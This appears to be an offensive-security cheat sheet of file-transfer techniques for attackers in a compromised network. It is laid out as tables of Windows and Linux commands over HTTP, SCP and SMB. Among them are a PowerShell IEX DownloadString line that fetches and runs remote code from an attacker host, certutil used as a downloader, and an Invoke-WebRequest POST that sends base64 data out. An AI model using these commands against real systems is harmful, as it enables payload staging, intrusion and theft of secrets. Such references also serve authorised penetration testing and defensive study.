**Overview:**
- Attackers frequently exploit legitimate services (like SSH or FTP) to move files quietly within a compromised network.
- File transfers look simple but are powerful: misconfigured SSH, FTP, NFS or MS-SQL services let attackers stage payloads, exfiltrate secrets, or pivot to the OS with minimal fuss.
---
## Web Server

|Operation|Command|Platform|
|---|---|---|
|Download|`IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/<file>')`|Windows|
|Download|`certutil.exe -verifyctl -split -f http://<lhost>/<file>`|Windows|
|Download|`wget http://<lhost>/<file> -O /tmp/<file>`|Linux|
|Upload|`Invoke-WebRequest -Uri http://<lhost>:<port> -Method POST -Body $b64`|Windows|
|Host|`sudo python3 -m http.server <port>`|Linux|

---
## SCP

|Operation|Command|Platform|
|---|---|---|
|Download|`scp <user>@<target>:/tmp/<file> C:\Temp\<file>`|Windows|
|Upload|`scp C:\Temp\<file> <user>@<target>:/tmp/<file>`|Windows|
|Upload|`scp /tmp/<file> <user>@<target>:/tmp/<file>`|Linux|

---
## SMB

|Operation|Command|Platform|
|---|---|---|
|Host|`impacket-smbserver -ip <lhost> -smb2support -username <user> -password <password> <share> <path>`|Linux|